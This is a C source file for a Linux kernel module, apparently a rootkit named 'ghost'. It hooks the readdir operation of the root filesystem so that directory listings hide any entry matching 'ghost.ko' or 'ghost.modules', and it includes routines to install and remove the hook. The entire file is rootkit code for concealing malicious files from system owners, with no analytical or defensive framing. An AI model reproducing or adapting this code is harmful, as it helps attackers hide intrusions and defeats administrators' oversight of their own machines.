#include <linux/fs.h>
#include "cr0.h"

/* typedef int (*filldir_t)(void *, const char *, int, loff_t, ino_t, unsigned); */
typedef int (*readdir_t)(struct file *, void *, filldir_t);

static unsigned char *modname = "ghost.ko";
static unsigned char *conname = "ghost.modules";

readdir_t orig_vfs_readdir = NULL;
filldir_t orig_filldir = NULL;

#ifdef CONFIG_X86_64
typedef unsigned long  u64_t;
#elif CONFIG_X86
typedef unsigned long long u64_t;
#endif

int hook_filldir(void * __buf, const char *name, int namlen, loff_t offset, ino_t ino, unsigned int d_type)
{
	if(*(u64_t *) name == *(u64_t *) modname || *(u64_t *) name == *(u64_t *) conname)
		return 0;
	if(orig_filldir == NULL)
		return 0;
	return orig_filldir(__buf, name, namlen, offset, ino, d_type);
}

int hook_vfs_readdir(struct file *filp, void *buf, filldir_t filldir)
{
	orig_filldir = filldir;
	if(orig_vfs_readdir == NULL)
		return 0;
	return orig_vfs_readdir(filp, buf, &hook_filldir);
}

void do_hook_readdir(const char *path, readdir_t n_readdir, readdir_t *o_readdir)
{
	//unsigned cr0;
	struct file *filp = NULL;
	filp = filp_open(path, O_RDONLY | O_DIRECTORY, 0);
	if(IS_ERR(filp))
		return;
	if(o_readdir != NULL)
		*o_readdir = filp->f_op->readdir;
	//cr0 = clear_cr0();
	filp->f_op->readdir = n_readdir;
	//setback_cr0(cr0);
	filp_close(filp, 0);
}
void do_hook_root_readdir(void)
{
	do_hook_readdir("/", hook_vfs_readdir, &orig_vfs_readdir);
}
void do_unhook_root_readdir(void)
{
	do_hook_readdir("/", orig_vfs_readdir, NULL);
}
